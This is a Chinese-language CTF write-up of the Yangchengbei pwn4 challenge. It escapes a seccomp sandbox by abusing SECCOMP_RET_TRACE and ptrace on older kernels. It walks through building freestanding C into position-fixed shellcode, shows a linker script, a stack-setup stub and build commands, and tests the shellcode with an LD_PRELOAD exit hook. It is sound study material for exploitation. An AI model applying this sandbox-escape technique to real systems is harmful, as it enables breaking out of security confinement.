---
title: 羊城杯pwn4 - TRACE 沙箱逃逸
date: 2024-09-15 14:09:18
tags: TRACE 沙箱逃逸
---

### TRACE 沙箱逃逸

本题目为羊城杯 pwn4，为一道沙箱逃逸题目。首先查看沙箱规则，注意到不像通常沙箱的行为直接`return KILL`，而是`return TRACE`。

```
$ seccomp-tools dump ./pwn
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x05 0x00 0x40000000  if (A >= 0x40000000) goto 0009
 0004: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0009
 0005: 0x15 0x03 0x00 0x00000101  if (A == openat) goto 0009
 0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009
 0007: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x7ff00000  return TRACE
```

查阅资料发现`return TRACE`行为是由`SECCOMP_RET_TRACE`来控制，同时查阅第二节seccomp的手册对应的介绍。注意到两点（1）沙箱规则中的系统调用发生时会去通知该进程的tracer，tracer可以`skip`或者 `change to a valid system call`来处理本次系统调用。（2）4.8版本内核之前，在tracer被通知之后，沙箱就会不再检测，从而失效。第二点存在逃逸的可能，同时括号内说了安全的seccomp-based的沙箱应该禁止ptrace系统调用。

```
$ man 2 seccomp
...
SECCOMP_RET_TRACE
        When  returned, this value will cause the kernel to attempt to notify a ptrace(2)-based tracer prior to
        executing the system call.  If there is no tracer present, the system call is not executed and  returns
        a failure status with errno set to ENOSYS.

        A  tracer  will  be notified if it requests PTRACE_O_TRACESECCOMP using ptrace(PTRACE_SETOPTIONS).  The
        tracer will be notified of a PTRACE_EVENT_SECCOMP and the SECCOMP_RET_DATA portion of the filter's  re‐
        turn value will be available to the tracer via PTRACE_GETEVENTMSG.

        The  tracer  can  skip  the  system  call by changing the system call number to -1.  Alternatively, the
        tracer can change the system call requested by changing the system call to a valid system call  number.
        If  the  tracer asks to skip the system call, then the system call will appear to return the value that
        the tracer puts in the return value register.

        Before kernel 4.8, the seccomp check will not be run again after the tracer is notified.   (This  means
        that, on older kernels, seccomp-based sandboxes must not allow use of ptrace(2)—even of other sandboxed
        processes—without extreme care; ptracers can use this mechanism to escape from the seccomp sandbox.)

        Note that a tracer process will not be notified if another filter returns an action value with a prece‐
        dence greater than SECCOMP_RET_TRACE.
```

由于没办法确定远程环境的内核版本，同时查询到22年Google CTF有类似的[题目](https://n132.github.io/2022/07/04/S2.html)。作者进行了详尽的分析，它的环境应该是对执行二进制文件逃逸，但是本题只能用shellcode逃逸。把作者的exp拿来验证，确定本地可行。

接下来的工作就是怎么把作者的exp转化成shellcode放到本题来执行，这是我写这篇的目的。exp.cc中存在各种库函数的调用，还有fork之后父子进程的处理，手写shellcode比较复杂，所以尽量得借助于编译器。

1. 去除库函数的依赖

需要手动实现`syscall`和`memset`.
```c
static __inline long syscall6(long n, long a1, long a2, long a3, long a4, long a5, long a6)
{
  unsigned long ret;
  register long r10 __asm__("r10") = a4;
  register long r8  __asm__("r8")  = a5;
  register long r9  __asm__("r9")  = a6;
  __asm__ __volatile__ ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2),
              "d"(a3), "r"(r10), "r"(r8), "r"(r9) : "rcx", "r11", "memory");
  return ret;
}

static __inline void zero(unsigned char *s, size_t n) {
  while (n--) *s++ = 0;
}
```

2. freestanding的编译

为了保证shellcode尽可能短，不需要lib库的链接以及各种安全机制。

```Makefile
$(CC) -w -c shellcode.S -o shellcode.o
$(CC) -ffreestanding -w -c exp.c -o exp.o
```

3. 链接到指定地址

在题目中前段可以实现任意shellcode的执行，因此可以通过mmap去映射一段指定地址的内存，这里我们那使用0x800000举例。我们需要把编译出的shellcode以及自定义的函数链接到0x800000地址上，这可以通过给ld一个`linker.ld`的配置。

```Makefile
$(LD) shellcode.o exp.o -o $@ -T linker.ld
```
我们需要把所有的内容都集成到text段，因此把text段设置为可读可写可执行。
```
PHDRS
{
    text PT_LOAD FLAGS(7);  /* 7 = Read + Write + Execute */
}

SECTIONS
{
    . = 0x800000;
    .text : 
    {
        *(.text)
        *(.data)
        *(.bss)
    } : text
}
```

4. 提供初始化

通常在正常执行`execve`切换进程镜像时，操作系统内核会为进程申请栈空间，之后再返回到用户态的入口点，这样_start函数不需要自己处理栈内存，这是ABI规定的。但是我们必须在shellcode的入口点提供栈地址的初始化，因为编译器编译出的函数是需要使用栈的内存的。

栈空间不需要太大，根据函数rbp-rsp的间距和函数调用链的长度判断。这里没用选择使用PC偏移寻址，因此需要mmap的内存和链接地址一样，而使用PC偏移寻址在下文会执行失败。

```ASM
_start:
    lea rsp, [buf + 0x200]
    jmp exp
```

5. 测试shellcode

这是编译，链接，copy的流程。最后的exp.bin极为shellcode，可以使用xxd转化为头文件`exp.h`。

```
gcc -w -c shellcode.S -o shellcode.o
gcc -ffreestanding -w -c exp.c -o exp.o
ld shellcode.o exp.o -o exp -T linker.ld
objcopy -O binary -j .text exp exp.bin

xxd -i exp.bin > exp.h
```

我们通过劫持pwn题目的exit函数去验证执行shellcode能否绕过沙箱。

```C
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#include "exp.h"

int probe(unsigned long addr, char* shellcode, int len) {
    void *rwx = mmap(
        (void*)addr, len, 
        PROT_READ | PROT_WRITE | PROT_EXEC, 
        MAP_PRIVATE | MAP_ANONYMOUS, 
        -1, 
        0
    );
    if (rwx == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }
    memcpy(rwx, shellcode, len);

    // Jump to the mapped memory and execute
    void (*func)() = rwx;
    func();

    // Clean up
    munmap(rwx, len);\
    return EXIT_SUCCESS;
}

typedef void (*exit_fn_t)(int status);

void exit(int status) {
    printf("hooked exit(%d)\n", status);
    probe(0x800000, exp_bin, exp_bin_len);
    
    exit_fn_t real_exit = (exit_fn_t)dlsym(RTLD_NEXT, "exit");
    real_exit(status);
}
```

劫持exit测试shellcode发现成功绕过沙箱。

```
$ LD_PRELOAD=./hook.so ./pwn
1. Add note
2. Delete note
3. Edit note
4. Show note
5. Exit
>5
hooked exit(0)
flag{aaaaaaaaaa}
^C
```


### Speedrun

本文的贡献是介绍了利用编译的能力去创造出一个具有复杂执行流的shellcode的方法。全部的代码放到[这里](https://github.com/Giles-one/DeadSeaScrolls/YCB-pwn4)

```
$ make
gcc -w -c shellcode.S -o shellcode.o
gcc -ffreestanding -w -c exp.c -o exp.o
ld shellcode.o exp.o -o exp -T linker.ld
objcopy -O binary -j .text exp exp.bin
gcc -ggdb -o probe probe.c
xxd -i exp.bin > exp.h
gcc -ggdb -w -shared -fPIC -o hook.so hook.c
$ LD_PRELOAD=./hook.so ./pwn
1. Add note
2. Delete note
3. Edit note
4. Show note
5. Exit
>5
hooked exit(0)
flag{aaaaaaaaaa}
^C
```

